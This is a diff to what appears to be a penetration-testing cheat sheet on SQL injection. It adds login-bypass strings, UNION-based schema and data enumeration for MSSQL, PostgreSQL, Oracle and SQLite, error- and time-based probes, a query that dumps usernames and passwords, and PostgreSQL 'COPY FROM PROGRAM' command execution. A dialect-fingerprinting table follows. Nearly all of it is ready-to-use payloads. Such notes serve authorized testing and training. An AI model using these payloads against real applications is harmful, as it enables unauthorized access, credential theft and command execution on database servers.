@@ -2,6 +2,17 @@
 
 Find string, numeric or parenthesized context; compare true/false requests.
 
+## Login bypass
+```text
+' OR 1=1-- -
+admin'-- -
+admin' #
+' OR '1'='1
+admin') OR ('1'='1
+```
+- MySQL `--` needs a trailing space (`-- -`); `#` must be URL-encoded (`%23`) in a query string.
+- Quotes filtered: MySQL hex strings `0x61646d696e` instead of `'admin'`.
+
 ## In-band
 ```sql
 ' AND 1=1 -- //
@@ -52,3 +63,64 @@ WHERE name IN ('show advanced options', 'xp_cmdshell');
 '; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;-- -
 ```
 - Last line undoes the enable (assumes both were off). `xp_cmdshell` runs as the service account → check `SeImpersonate`.
+
+## MSSQL in-band
+Concatenation `+`, comment `-- -`, no `LIMIT` (use `TOP`).
+
+```sql
+' UNION SELECT NULL,@@version,NULL-- -
+' UNION SELECT NULL,name,NULL FROM master..sysdatabases-- -
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -
+```
+- Last line = error-based: the value appears in the conversion error. Wrong column types: use `NULL` or `CAST(x AS varchar)`.
+
+## PostgreSQL
+Concatenation `||`, comment `-- -`, stacked queries usually allowed.
+
+```sql
+' UNION SELECT NULL,version(),NULL-- -
+' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- -
+' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT NULL,current_setting('is_superuser'),NULL-- -
+'; SELECT pg_sleep(5)-- -
+' AND 1=(SELECT 1 FROM pg_sleep(5))-- -
+```
+- Superuser + stacked queries → `COPY ... FROM PROGRAM` ([databases](../enum/databases-and-redis.md#postgresql)):
+```sql
+'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'; -- -
+' UNION SELECT NULL,string_agg(o,E'\n'),NULL FROM cmd_exec-- -
+```
+- Column types must match: cast with `::text`.
+
+## Oracle
+Every `SELECT` needs a `FROM` (`FROM dual`); concatenation `||`; no stacked queries; no `LIMIT` (`WHERE ROWNUM = 1`).
+
+```sql
+' UNION SELECT NULL,banner,NULL FROM v$version-- -
+' UNION SELECT NULL,table_name,NULL FROM all_tables-- -
+' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
+' UNION SELECT NULL,user,NULL FROM dual-- -
+' AND 1=(SELECT 1 FROM dual WHERE 1=1)-- -
+```
+- Object names are uppercase. Time-based: `dbms_pipe.receive_message(('a'),5)`.
+
+## SQLite
+```sql
+' UNION SELECT NULL,sqlite_version(),NULL-- -
+' UNION SELECT NULL,group_concat(sql),NULL FROM sqlite_master-- -
+' UNION SELECT NULL,group_concat(username||':'||password),NULL FROM users-- -
+```
+- No `information_schema`; schema is in `sqlite_master`. No `SLEEP`.
+
+## Pick the dialect
+| Probe | Works on |
+| --- | --- |
+| `@@version` | MySQL, MSSQL |
+| `version()` | MySQL, PostgreSQL |
+| `banner FROM v$version` | Oracle |
+| `sqlite_version()` | SQLite |
+| `'a'\|\|'b'` returns `ab` | PostgreSQL, Oracle, SQLite |
+| `'a'+'b'` returns `ab` | MSSQL |
+| `CONCAT('a','b')` | MySQL (also newer MSSQL/PostgreSQL) |
